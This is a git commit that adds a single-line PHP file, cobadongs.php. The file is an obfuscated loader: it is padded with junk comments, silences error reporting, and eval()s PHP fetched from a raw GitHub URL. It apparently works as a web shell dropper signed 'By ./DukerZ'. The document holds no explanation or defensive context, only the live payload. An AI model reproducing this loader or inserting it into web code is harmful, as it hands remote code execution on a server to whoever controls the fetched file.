81248196551f390789408c27ebdba94feb6a8f7e
masihpemula88 <colagacor@gmail.com>
2025-01-30 19:29:28 +0700

    Create cobadongs.php

---
+++ cobadongs.php
@@ -0,0 +1,1 @@
+<?=/****/@/*77777*/null; /******/@/*77777*/error_reporting(0);/****/@/*77777*/null; /******/@/*77777*/eval/******/("?>".file_get_contents("https://raw.githubusercontent.com/masihpemula88/masihpemula88/refs/heads/main/cobadong.php"))/******/ /*By ./DukerZ*/?>
